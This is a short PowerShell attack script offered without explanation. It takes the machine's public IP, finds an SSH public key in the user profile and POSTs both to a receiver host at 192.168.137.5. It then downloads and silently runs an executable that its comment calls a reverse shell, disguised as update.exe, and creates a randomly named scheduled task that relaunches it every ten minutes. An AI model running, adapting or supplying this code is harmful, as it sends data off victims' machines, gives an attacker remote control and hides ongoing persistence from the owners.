& {
    # Get public IP
    $p = (Invoke-WebRequest https://api.ipify.org -UseBasicParsing | Select -Exp Content)

    # Find id_*.pub file
    $f = Get-ChildItem $env:USERPROFILE -Recurse -Include '*.pub' -File -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'id_*.pub' } | Select -First 1

    if ($f) {
        # Read the file content as a string (preserves newlines, etc.)
        $content = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
    } else {
        $content = 'Not found'
    }

    # Send to receiver (using plain text body)
    $u = "http://192.168.137.5:8080/$env:COMPUTERNAME"
    $headers = @{
        'X-Message'   = 'Jeeva Halal'
        'X-Public-IP' = $p
    }
    Invoke-WebRequest -UseBasicParsing -Method POST -Uri $u -Body $content -Headers $headers -ErrorAction SilentlyContinue

    # Download and run reverse shell
    $wc = New-Object Net.WebClient
    $wc.DownloadFile('http://192.168.137.5:5000/download/update.exe', "$env:TEMP\update.exe")
    Start-Process "$env:TEMP\update.exe" -WindowStyle Hidden

    # Create persistence
    $rn = [guid]::NewGuid().ToString().Substring(0,8)
    schtasks /create /tn $rn /tr "$env:TEMP\update.exe" /sc minute /mo 10 /f
}